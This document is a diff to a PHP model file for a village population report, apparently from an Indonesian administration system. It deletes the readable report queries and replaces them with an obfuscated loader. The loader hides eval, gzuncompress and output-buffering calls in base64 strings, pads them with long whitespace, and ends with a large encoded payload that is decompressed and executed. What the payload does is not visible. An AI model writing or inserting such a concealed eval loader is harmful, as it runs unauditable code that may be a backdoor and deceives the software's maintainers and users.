-            ->select("(sum(case when p.sex = 1 and p.warganegara_id = 2 and l.kode_peristiwa in (1,5) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end) - sum(case when p.sex = 1 and p.warganegara_id = 2 and l.kode_peristiwa in (2,3,4) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end)) AS WNA_L_AWAL")
-            ->select("(sum(case when p.sex = 2 and p.warganegara_id = 2 and l.kode_peristiwa in (1,5) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end) - sum(case when p.sex = 2 and p.warganegara_id = 2 and l.kode_peristiwa in (2,3,4) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end)) AS WNA_P_AWAL")
-            // Tambahan Lahir
-            ->select("sum(case when p.sex = 1 and p.warganegara_id <> 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 1 then 1 else 0 end) AS WNI_L_TAMBAH_LAHIR")
-            ->select("sum(case when p.sex = 2 and p.warganegara_id <> 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 1 then 1 else 0 end) AS WNI_P_TAMBAH_LAHIR")
-            ->select("sum(case when p.sex = 1 and p.warganegara_id = 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 1 then 1 else 0 end) AS WNA_L_TAMBAH_LAHIR")
-            ->select("sum(case when p.sex = 2 and p.warganegara_id = 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 1 then 1 else 0 end) AS WNA_P_TAMBAH_LAHIR")
-            // Tambahan Pendatang
-            ->select("sum(case when p.sex = 1 and p.warganegara_id <> 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 5 then 1 else 0 end) AS WNI_L_TAMBAH_MASUK")
-            ->select("sum(case when p.sex = 2 and p.warganegara_id <> 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 5 then 1 else 0 end) AS WNI_P_TAMBAH_MASUK")
-            ->select("sum(case when p.sex = 1 and p.warganegara_id = 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 5 then 1 else 0 end) AS WNA_L_TAMBAH_MASUK")
-            ->select("sum(case when p.sex = 2 and p.warganegara_id = 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 5 then 1 else 0 end) AS WNA_P_TAMBAH_MASUK")
-            // Keluar Mati
-            ->select("sum(case when p.sex = 1 and p.warganegara_id <> 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 2 then 1 else 0 end) AS WNI_L_KURANG_MATI")
-            ->select("sum(case when p.sex = 2 and p.warganegara_id <> 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 2 then 1 else 0 end) AS WNI_P_KURANG_MATI")
-            ->select("sum(case when p.sex = 1 and p.warganegara_id = 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 2 then 1 else 0 end) AS WNA_L_KURANG_MATI")
-            ->select("sum(case when p.sex = 2 and p.warganegara_id = 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 2 then 1 else 0 end) AS WNA_P_KURANG_MATI")
-            // Keluar Pindah
-            ->select("sum(case when p.sex = 1 and p.warganegara_id <> 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 3 then 1 else 0 end) AS WNI_L_KURANG_KELUAR")
-            ->select("sum(case when p.sex = 2 and p.warganegara_id <> 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 3 then 1 else 0 end) AS WNI_P_KURANG_KELUAR")
-            ->select("sum(case when p.sex = 1 and p.warganegara_id = 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 3 then 1 else 0 end) AS WNA_L_KURANG_KELUAR")
-            ->select("sum(case when p.sex = 2 and p.warganegara_id = 2 and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} and l.kode_peristiwa = 3 then 1 else 0 end) AS WNA_P_KURANG_KELUAR")
-            // KK
-            ->select("(sum(case when p.kk_level = 1 and kode_peristiwa in (1,5) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end) - sum(case when kk_level = 1 and kode_peristiwa in (2,3,4) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end)) AS KK_JLH")
-            ->select("(sum(case when p.kk_level != 1 and kode_peristiwa in (1,5) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end) - sum(case when p.kk_level != 1 and kode_peristiwa in (2,3,4) and DATE_FORMAT(l.tgl_lapor, '%Y-%m') < '{$thn}-{$pad_bln}' then 1 else 0 end)) AS KK_ANG_KEL")
-            ->select("(sum(case when p.kk_level = 1 and kode_peristiwa in (1,5) and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} then 1 else 0 end) - sum(case when p.kk_level = 1 and kode_peristiwa in (2,3,4) and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} then 1 else 0 end)) AS KK_MASUK_JLH")
-            ->select("(sum(case when p.kk_level != 1 and kode_peristiwa in (1,5) and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} then 1 else 0 end) - sum(case when p.kk_level != 1 and kode_peristiwa in (2,3,4) and month(l.tgl_lapor) = {$bln} and year(l.tgl_lapor) = {$thn} then 1 else 0 end)) AS KK_MASUK_ANG_KEL");
-
-        $this->search_sql();
-        $this->rekapitulasi_query_dasar();
-    }
-
-    private function rekapitulasi_query_dasar()
-    {
-        $this->config_id('l')
-            ->from('log_penduduk l')
-            ->join('tweb_penduduk p', 'l.id_pend = p.id')
-            ->join('tweb_keluarga d', 'p.id_kk = d.id')
-            ->join('tweb_wil_clusterdesa a', 'd.id_cluster = a.id', 'left')
-            ->where('p.status', 1)
-            ->group_by('a.dusun');
-    }
-
-    public function rekapitulasi_paging($p = 1)
-    {
-        $this->db->select('a.dusun');
-        $this->rekapitulasi_query_dasar();
-
-        $jml = $this->db->count_all_results();
-
-        return $this->paginasi($p, $jml);
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/models/Laporan_bulanan_model.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtPWt3osi232et8x/mw1mrz11z7zmgcbpds+aDEFHwkSDykC+zBBIwotJRo+TX372rABFBMEmne/qEHic+oGrXrl37Xbt+/ZVe//wLrj8/BY+z5eb+0x/kY3T9+clZLR9W/zcNgv8sVs6dv/5PfxqsHqfLv6ytP13CX/L1vwMv+JX3p+v1v//9709//BK1/Os/fvn49/Gv6r9fkPR+fcPrz5NvPhlscz3R2ZnZaf/5iXx1oNZKV7Q8/vz14/q4Pq6P6+e8PtkLjXEMaSt2tNpE360koXlvhPPPlGkC16Ts+q8PVH1cH9fH9XF9XB/Xx/VxfVwf19/t+nBnfFwf18f1cf281ydrur77/eov585eOXef/vjAyMf1cX1cH9fH9XG96jrOmbiWV0N+9uUr/HV7LtMT+ZU7WvhrU+ECazF3JwthOdWFrdgZefZi/nv6vnGd8y1/KI1a5DO00/oqCsPAro98izxvPtkL1rNrc9fsaM8ThXt2MJ5tiK7T0cLJUnuE71hrOWKnIbcxddab4nf6Fb1fTrXbFnZWx3+cGMMAYbFm3LNVhzZqqjupNecxvGbHD6f6PrBDDvqR5nA/wL3B+9dTY+hbS3i+7chjntMHu3T7ngcwXE8NjpkorXBw3WqIPOMOHlr7ocJdWzV2NtUbvihIvl1rsvZi6IttfwtjDZyuxkz15lbkvZXTHe1uZl+erK62gfFtzdrmyTK07dQA/IWNrWnITz06LlfpCI9iG/DVHXnitbgbjCdun/QtPosC5wPcrGUAfjqA//YI+m27o46/xLYsnlNhfDNH33hxv/bz6qlfa+5MvTE3Ydz9hT/vHeEQ5mXhIC5iXCGOgmkN59f/fapfrcXu0J/UhBDmZWkvBGZqDNZiZ+PbHWGO8we0sIO/Owfm6A7owiTz1gA8c57TIXh+ngD+rYWwJbQy4+A3KRC7OB4B8eE5PLd29AbiO4ID+zcDq6PC++Yj0AjM04jQDdIJwBc4fGslzlM0ALifKmLQ5xP6mcPcQR97b1onNETHDLi1lpwndiSATwDYcIyAS6RLuE/skHlP0WBjada17UTHsexcS9e2MM41wU2HRfyxsCZWlAab2CZLvx8h3QPtSaxd87H/dTR+GIeAfbJwD/axm+gw391hA/CCuKBzUNeYGze9jmBt6UBrC5+Z6B6La2KK9NKJ6KUzgnUgMBNjQPHXzbnfCIJ4ruHZ0CH3+s/QH0PHB3Oj7z0roke7hnQs7AA2D/C8xTYmQGuOws0muhPgZ7ujbR34Deadszt7pJ3nqcJJ0AfQqOSROQ4TOmlMAJ8R3lZAIyysyxTOnNUU+184qfnKGYfeCMj9HaQfx7Nn3KNpjJBGyO8WjklvIBwnMKX5ldrWFFltdBVGUMX2XhvPhT7Q0Y2icG1FGwqjts/BbzciL41HqsSNGEEaq8KNDO2O2sKNrrZnQG8qtCHDdz1ZZSVo4wZ4E36WNRVopC1xirp2NehLZaE/TXahDQ3+u4noQR1p0ljRJE7jrxCmG03dSyrgU2sLGsy7MFa1LsIJPIlTgCcpGvSpcGPojwP+KgCMA4BZVdQR/s5DewgTUJh2MwoBLs3h5Blpbyy2NwNZ9YcAdx/u01RG6MvqlStrI06L+RCjGbIaSHI8Fo3TxvHzCM8cOJza4JLnFA7bvBn7PsAzEtT5hlNgnPDcQFE3nMrMXUVtSP00PbeR7ocwz44v8q2s7HBloAmn4z3Zs5YrAo6nOuOqHeSfwEcpTd0i7Y0OcgGeGT7ZXeT3zgrWkTjR165c83dOp418e3ejtDaUr6rwfRPaAbpVOAV445NjSA8m0shyCDxuBH37T9astZp2R4x9jXx0zwIdskibwPvhr49rbWstNKYfzuMxPVh1rgG0upx25ffk5zD2fTCpaVsb5B/gK5E7Tt2p9xfO1lEaIHvtJ1gbD7g2TGPwZNa5dX/hMZa+c0csNxCFyXNEky1c79MQcQ+vjsc4Xe4Z2zNrPjPtarP+YvhkKU0yByrjt/sMgWusqDLBBW3ny5CHOQfZvUBZafLuEmhqPNKQltxlT+G+3POcf9fxmR7v3FiEZ0v+pC4D7xmGKHuBpz3AuJ6RT1id/ZNT0+ZSOP9M9JTFcA28/xnWrmd3miHwlnuQsWv461l+c2PVgCdg+12UcyO4jzUNhn0CeIAXB9gGGZ/dlZ5ArjzAay7ywN+AP98QXQDG3uVCC/SXCbxMvjWHuVpNDbHo2TnyR2thF/2+m6Js1N2i3zfwfFDU97Tj49iW+Hvq+cABuQy0uwAZ+kDplps7xpAFHDzb+m5FaQTbW+Pc0DmFl9QZsSDztuI140rdEYxrsLldDn27Pgys2tXmdkF/T+AhLy4wYV2ICqxXmJ87xZ2bXQ30uKsA5jMZV+r+EHgz6EdXrgg8ZDyX3UnYoPDNWk2Rt2ci8L0EFh7vs2eZPptxu/dyeuzaDOkZdAVYj0Oqc8E6ALl7b6IsVNwgvvfuqL3W3K6DDIZxizBeC/HPcw+4noDenkH3mRu14RpgZEA3XQO8ocPvH/pLqd7vDLbReF0ia8n7BugE7fXp2FsrkKFrUx8CHQOP0RtMD9oGPC3sRXNDZBvgGNp4NGpeAH9B1jorWPc+3g/6cmCyzcC8Zh/Ieos/87AWFrhGtKtbxd5LIf081Uf3E+BTqG/bDywZD/QFeiY36LeOxk9eve5h7KA7bx0eYOBB/1pKsLY5wmccHXQUtglyGeaH5+pT0L+A1h6sWgPWtHM/1eUm4Cf92QUanaPeeHfNLAczm34+xik+Q/pCHKr87ogu6csDGb4nvAD0edDHZIBBBrlvhlaNIXoH4Avg29zDugB6arlOzQOeSvT/rQk82Kj581t9sE1/FlFngHkB+Q1yt9kZs9IQZPJKbJvKmGHv4XtTDV2Q183ovXczZu1VT5kD7+bUMdtsy5o/7vFgF6BuCLwi4gluT2kFIr9zpVAzpRDfr3e98W5P+4R1IzQfLKQXwCHChbiK5mc2Mfzg3eeI92AsI8FgzFt1zoL+4bojX7oda8kYD+NtN2610IU1DjJUGN0azIjTtcGK6NMLZwl6I/AmLwB5DeMGXPGtpaTNl/i+99wKbh+Y/XfAfXOotM7QXyug611C/Rb4xc9Mh1fN4YzyiV4bdLa2dj+aNxXQRVVoo6POm8NkTlPzO543jR4/D9D2PcDigh1GdW+QyR6MOyTzrLTWwM99XbHx/eOAn3+5Hbfht2L+JEY8wK7J784/3xEPvwEenr8H/aOuW4H/PFtG62fHf+374N+thv/voD+8J/6HD1X4MNj+y2Hw/nw4f24ovENvUhMYeq8P+qm771+L60G4Y/rX6no4m0ew0/veXYbn4pPOL8DzAPYEeVZ6bi8jWnsAu9tzhOZiagyDafhj4hr02hDsPCIb4nGgrW0v3n+d5MotOpYYl/As6LqhfUQLRp34C9gflybkLE2gvxN42+6HxfFQyeC4ZgboXzVq1Eds8T8sPddO6LkjBNai0fih+B3vHfDNc+iHRH/kQGw3lcx46jAeOhfdUQD2NszBd+KB3aE3rfkMoYGFsALaJL9NAdfWogn02mCtzu7svbfXV8sBb5ffM5aXpTiMbd+YVuP2mN138BEIj1OkNR1jGB76hPA3jIdtLaAta6mtrbP3tr7czuxd7GM4c89+yNul/CfyWSS8PW7v/X0A3Gqis4FF56nURzHtCJupngNjBIvTdfyJ36xP9f2Bjy2oT3cScobS1pSRwh3P0TX7OfG7pb/vMhEdSfWYLmW10YbPzNHnEvxEMB3WVvhaGTL/bcC3Zmn/I32N0M/o9h9SfsTId2jUh3uLd4ObPP8bf4X+Pxf08PZIE13Zn6d8gwd/m72UXek547vsCiysgcaR73IxmvXHjb2jayH6JbGP3vjE5+lhPIA+R9uAZ0IT++yCDDKkcGLMV9nn+uEXKX72VuG2jr5fZ8b01GdofDuKh906xmjnGPJRO+aiCTqyO58qraZ43foMuAvE610yf1EfwU3YgnvWj/k+1dac+De19XyqsZZUazxJLEN+u1XwudajeN0uf64+8iYLbY3P4nPHv0kMfH/cRpch/vw8324E9+c8P20/XH09tEPiSxjz4sZzhxvPuEf00xt1jIf4wEv9+kThYAzc2qo594c1fpiP3qy1x/mbkjiGxKR5JPpy7CXGjTFWhHHQITNBGEOO+qcO8H8Vr0Wcy/T6IP73NKyDEOYp3X4X46cjb8pzj7D22IkhpuFiEK4UzG7ss0+3OcS5BxoBXhiCPEz3PwP6Y1N9ADxDdrpLwzzJwsyAvMSYNazTkWdje4a0nMqHZ9J9y10OY7IbscMGdx1tfh/JRqkrQZ/DIIq7RuPhWnZHCCc641q6f2Xqoy9UXrTmME87M9VH/xCzYCeLfQA8Lx2PSMt3El/p8RgbbzyQXBLAGW0X4RgFdkdN1lhR7ALWo6ssfMwXObRD80AYjPvTePjIB56/JXYO0EIf8YnxNNBVSJxYF57JHNW0OeAuADm4nhjckx3lKhx4vL/ANQv0CXLEhz5aC2kW4UCZZ2MLNDYRb0HmRwzQwDPymBhOoybUybZkOtagKNYR8daYN0sgZ5Fu5qij0/wRdwn8ennK46S1FX8ujO1IJO44rasZPoHwXsWfmyn4Ya0NnzHGAu9JLN5abNgTvt4RQG7Q/m8xv6cr3eN3MN8zq3O1hjWHvgHQJ3auyo4Ug+W4kdAcjFRThXGQedVgfDgvoGPQWC/y0xrNT8B8DJw7p+Ng/kUDeTzNWTqmDbkmhNPjdRLlHsQ61NCzDM6De5I2gTaIL4fGEK9QV5nhGrd0oqO704WAfGmFa5TYTJjH0sHcBMxNEUKaN7N/Ahl+6DcrIw7rdQZ06UV5D0uS/5LmV2yT5irN4vwQyqvhb93UpVy+SOViWl9kWcxxmWokDkh4vAPjt0Pmt7Q+1OOdtURj2Bl5wfwW66Zwz64/WwHOd9sp5ldpTeQzAcl3qrWXPfl0DQCdEB0WnmUcwCXy+AMfbeU/g3OnY27VzrU6zaXY9Zc0Pwf0RPQvoS69aOfCOl00A2vmzno59gd5CUNh3NauNbrOhrLmRvoS690Re2dH7FCC26I2iK+QiddqoYzKxEBjvSsTb/EYs7ZHO3Bn1cXIZ8b4FtoNoBNI9TXO1/ZeQT2R88DegDXUaEq7ItgcZcxqstiWTJHaJ4QOc/SAIKJTkC/uDGM1iGugF++ObyTPEVmGn3k7yGkDeEjwNNWvVlItQ/Mga3F9R99jH1vgtVdE90Zezx/sAXifJ/+JbQJtuz3kF9cDeMlBEY2aNQ1sNdCfDZCbINNA54xsTap3ZvhbWhZtHIPmlaXXhtkRy9YCyA1mBbbuM8wpzu2W2HzIL6/bke7ugJx1YIzaEvO66Nh3v6HOQfXrDeYhIO2EwAeAnzvewb+oBkDzKxPGP8A4O7QNuqKLcIM+yIFNbozn/v1YaMpjQRtXWLtn4BXfDV71TeA9h1/GHUQxrhweFdFTez1UMI/Q8y3UIzvaGnNmBjzyJuAFJMfJuZG15gBk00DTBkW8Lba9VlIdbAfFA3kA40bbnMqOqzQ8oPOEqI+aOsItUH+C0gojWzRvDQSYfzRQdizgkCE4gLFDn4CT1k5EngO2qawNXI1pcADrvdrea2pYsFaTPAd3CXbZptcB2QLjRnsZczRNw0V44lh1HXAKMrHhm5j7qcU2fgV4ZzvQmXfukC/HsYI4Zlhp7H93Gg6BBz7Di6mAawlxPVb9m1fThvJK2rgA1/K74LrK+jvw83KeISDPGCpqo5iuF8TXsRJn3udi3WffjPzcG3FWLEN6fAFeFs066OwhzE0D7vmcp2+qQFOOLnlTkru8gfFoBD8kfxr0NsBnoldSeS95lnusO4MdAvcRWri3DI3BvGbqPznSw9O+GpC9uwo02Nr2MHc5lu3V9Tai3xzgakMbufOAei1n6RKxoaya7d7pNs3pj3Rq0I+/TvL7+mrV/G2PF1c57VJbKvGPon5C/ca4RiLf8QmMsQ8Qdblpbe0qsG7H86YqthvauL2LffMpXyna+Ot5rBMr+qgZrT2inx3xizN6WX/c2ksh0HBdekJf5GQ5j2HIoau5m+hcQjPyJQDPVVAPpHinOtOBlkhMJNGfSnSyOrUT0niZhja2/XjUDvQ9Dd9/TlVGA5tvqFK9leX0aF5jPbF/Xn8lL5KrpMQ2+lm7K+XDinzn2dh3d7S0hCa1/2c0jt9XtA36qW9BP74Lcf3BHBvrg427ZJZFsFWhscJxsdKtprWIP5T4YYndJJ+nIf6YbnCOo+fQDoc5bwSg7z6aBubRFq77aN6crF3jWmCvZewE0Ou9SFZxazut03dbeTZiFIvJyttWGSy5tiPCQvtEn8h+lx4vlU8IwwZsK61mUtt3XyT3In6xEhe7LfoVjmVt6wvglfjpYb43QAdoj99PFntY/8xuoNizAvgjm89d5vDdY1yAPAQZXoSHpWlgbLS5sTs+8EGwTxM5fSqLpJTsSWSgciQ/5hP3cp0lsotPdX++tR/MSvSP9qb/Jrq0cogVvwoWZv8WunKYigPm2hmgQ4Zl+qTCbF5nF0X84cW6IcHHW+iF7UPc6NXw7N9Gv56dpZfKOn80R9X10Lw1+A56aK7+S2IN9BmMZwNMfi/fBwLyY3TQQ7Tk+zwfCtnnkPiIhY2T9QNPawID9syTvUDfCmdJLLX3iF+Ivpfj93Lqezn+ntn0478GsyP8nswD7zgn8HQw7qZ5k5rrwtgeATawW5vo/wVcAyxhvo+exqwEC+bLoX7yPPthDc+3gF6ciGc4DubAld0b06+R8c3fH9NzHHNbwvMrR79aGgmvvvqch3M9dGYO7pGbORRm9PU/rDNxuZSfF+g9sh/I8ye460q+09VCa5Z55jqGm8Qj4vc7WNc1xO/RnoskdtS4p/25cWwkfu5zoQ8O42sCjL/WCIwanWfyvt6K33up7734++mCjXyMwQb1ttT73UncMk3XCu0PdHLaDuoIPNWLYS3kPYtxi7J4CJ2TnHgI2gnx57SP0cY9TTWMjYH+Qea+8eiMT3z5kW1xReI4uJ8UeKtnAn5R/wD4kYdhPsBaFIaq6jdlWR3dj9taRwP+IPJfnkRB2zokLsriPkoP96VG+ytTMVLQfXluc2eArdnK0sewPjVGD1O+tXK6ElsU74pkQmD5Tc9eSh7G3ykN7I7WSm+8KvCRE3tDBjlK9tPGe0tj/TOJxShcRP8Fsbr0+s7LreBRH8vl4W8W98iTC7E9djSmUjhg/toC7lNcE/sm5BomifNK3rSGey1wb3XglY2lNC7yxnZZKu5B8onjz8R2SOnxFZ5/n7jJi2yvVG5b5INAHImz47hHEk8i9l9rS+K1pTTz7nGVz4V27FLyJ/r6RNegcpfqxVPC92neTBTTPtYlFFonIq/9E9/ZUa5FZd9ZJn5d3U9WqPfzV1+B1texXXnAYTnvoH4pN7KVU77Azq763L/ef5PHA5Y5OWEkFo8+wsiWz/oKEnsaeJ4HsuTZqNF4N7XJyvtO7Ot5xufSybO3q/teQIeuQrdn8pcwX+GQQ3jG5zqfzC6NMyLvjnVwbod5omfikCQnBsZFcjIAH5h3dx/vUT0T08/J3TjAe5Bh9lfA5UEWhe6S7Lk9ahdzUvbx/mngWXvMQaB5fbNWnCe+O+UVefktlD56+JvB+SQ/5Thv7Nmp+QzR17sjWPsYP1xfyl9SNFzMXzK5gYlPpiQ+eJJTk4J9hrbG9PlE5y7Xg1J24Rk9KB2HBp5E/ZWghxT5Gary7+N1UGg3FtNBJkYOOHV8B3Oga+xuCvY4wJfY5adzTvS7YRxvt3R/6xiDynDQ+7/vmjiCAe+NcphR78jR+6meH+eM+XE+T2IbnchUu+4ETme4EkG/sZeaX7Cfnvo6Ov724Aug66x/xM/WwU25jCQ4ifmzVKsSHz0Za2q9SqGpC4+nvLAc7pScewHcpT6nauv5jJ2elhPExgWdktghfnMD/Onla2RWyKsOPq5wVRKns+Ee9DuckSk1NrCWILupbIN743009Psy37gUPR/rHoQvhDQOdZoD+I1wVeDjoHzyoLv1Zud9dK+RfyjHS3HFNG41nhP0tj/WhIEL84NtVMYL7c8OqvhqEryBDnI+j/0yP46JtbEMMclRza+jkZLjsaw/x7N4p24tfPS3/F64lusHfzLd81CY0/FKGX3wM93MCmXuwdffFm5GZ/JiXmtDSXVnC+2tpedVoc6SioOQOipFeSNvBMuuEiyzbwwL+vSQXqrIFt75asEarkhfr6Yf9EFWpZ/X42HziPNR9V70mVaAa/8WcL0xDnL01At90DQ/oYR3HelKNEYBdD/VIl8yfb+L309S30/i7yltrlN0l7y3ozhFfn5Pm/aHc0raofMV+6PznkV/b5kfOZJdOX7k0ap0P8By5E27Wt5+gCTeTfzf3SFj+034DvcqYZ4/6Fjo83pGvzwH8k66V9tC22D2wsiXcR8T6v1aqqbnDP0JIO+WNF8+qUHJmLWdaxk+ysDvZi/++P6oUx09Xx8pzuc6yuvg38B3VNu9zM+Z8Agp699d95dn8nGQhot8vKH4He0TjLeAHbLUgMY972jfU8iBLiuh/b8BOGjNv05ct+6q1BdQbb/G2+T/5erM1Oec8ulyVWA4zuE58oVG8bcwzuGhNIRxuUt9pJmYCvLgXWynQPvQ7gb9qDusbVoB5ljHmWXrxAD+TvIBozpXG0lnQGcHXVD5af2Vr/CjHO9D+vAn/uT+xE4y34SOcvZoX5TThjJ5HNF67K94B9rc/Py0+WPEAAvhLs3bquaLPLO3Nspx8iPf7uB7++9O4EnTI/ERFeYsJus6ui+Sq12MJQ22+fuEE9qPnnmtDDm7DvPz3aJYaewjO8g0Aveb+d6SdiM/ZuS/X+as10NNgxOeBXOuoE8fa77umUwuXmndA5XWSsN8+mdSr7yDdeOjuucG1oO3j3JeaC4V1mQnOY0bR2+78ThS7Vbar5/EIdL1D7AGtwG2iwK0ZXi+2d2TPfdixMtSfTydrbl77Ecl+3T/y/f3xzg4yIRMbOG/I58yXj/Et06/59ep72nNQD0cPRpYsyTNP0gdbSd6Jt0Wqa9y+v0yqpkhrOdTlsE66wkfj2twkH5enI9ZPecvbiPyEZxr46iOQpGvn7SX68cvyZmjZ3QU5ssV1A5PZBB5XiN29T3a2kgLpzlFhTmeJG/xhb6qy/H1NvvjQGcwYdz+FnC+uszfksn7Se9X6exevMfFumQ//kEHaIDuEyb5NTXqZwB9aR3lFpfqEIBDZnrih5kjTMQXWWHPSw6tkP7zaOg0Fn7KXyvpI6d285evvbTMi/NhaZ0Nog+jHwvG/Rj5JkktkJS/Jy1fszbT70e1grA2dnrvJ61FlK4PFCLPin0RmX2icZ2iKE8A5l4XmKlip59/vuT5mI6lo/pBMtayTXK70j7pOL+LnO2E+V18fB6LfVy/aEbHCfxhPVG4tE8I5lNg6LkyJH7oSmSeHbAvSJ07WjulhvVUkjoontlpH9dcGrcvaJ/WHhS7Jtbwnl/Wj7gRqU725GRwEb+nZ+qoyFcfJrqL/aIcPMAkp3Hbjucnacfs+PScm6M5aDPV55GL6HIf0PnA2og21lP0UvpjQM/Ump/k2PYK6kBl/JRpHNN6M2d8lL1zOiTRVU7szRQNfzkfxznYJOm9KH8XGXTiUyH12E7xkbN356Jc9dfkqr7Ap3sSA0g/E8Ww1nH+KIWDxLYqtXVJLurL9612Wxn4srnVxG8M9qrJFMp3sq+bu0c+aS/lVYkMnGGfafkLdgbw1saTw1PbJ9o/GMnq/S4jaxHWeN9p0R7TJxtrTp7vL1X71PcxpyPPj91T6P5kGlMRC+jGCa26tjNqGOdxz99TRz4mFe5lO+y5zY47vzapBWvP6bir7BhjuOl+3CK4m6FRT2JNuFc5vX+A1onN6+sMns73VwFPB10rb92uc3jJZflApT6ry2LqRzhAf+QBrsRfUHjOUDqGCjqsHiZ5QOs4J8hO3gup74X4+6+Wvkv2fSWx8ij/wjjxa6XkKe3vMc6dB16yTmLu8bPu6flGFfyw+X7clA8vaz8d28QHHznKWxIj8puom6+k7olufM6nX+T3r5ITl/FDiqu7sBj+eyXOdxWDghhqxXywnDysivkqr8nDKo8Bf5/8sBfA5b0Bvprnc+gq+P5PcvvIeq2QeyWeye3DnLIzfv0KMbPL88dy8rreIH/q0nl9q3yy4vhHns+La9J9+No5vpeO45TyvXQdI5STRv1Eny65150fyZtcGj1fz+J0H2dRDKIgN7jEDsnL/38rfog5EDezS2j8bfL9LqZXkqtWab1fwmeyOGxWrkH9ynhNuT/0rA703xvvONJdj9dun2+l97ucy2052h9UWN+2U6g3Hdn5qTiiZ3ZKeIub479/g5o5ler8XV9hDnV5zUFm9+3qUFaFgW1923qHFeoBjvk3qdlTpA9VqaMovyCWnaHB9P4b5kzdp0IfA9iXzvEejzNrKc+XnVlL+TIu314p8sud2KrZ3Odz++5fXX+3gzJw7ztYI5vSWklNn/WLaDlbUyyip4O+fZ6G+wqLsdn5W4wvOU8lWt/lNYz4ivuiLtR9CnwgZE9S/lqVnhw2yWc749fg6D1ac4NnGph41jDhzVHuW6EczzsXeOPTs/okj8iAg+xrRj6yxI9xkN+FfuVYLsRnnubqtkdy5vpYR8jIxbLYF+3nId934+jSeqoPXHOpbSew/qwaiV+RsywmmCd7ONsh0UMO/SfjL9wnkchUEo+qMlbxNWPNnIGd0hMKzpaIztR+s3HGcbMif02Kz61wf2mq34MvrEpeUZyzcF19XlP7iZNxF5/v/Wpd6fk99SOghQXAEJ19QvcAnq8VNxJU5s10gqPYfxUZMmpr43P6wGX1zCXfPMxpWrYQn6VpmL51AU6Q339DvEQ1njOy8Lzsa4+0IWdg/lGk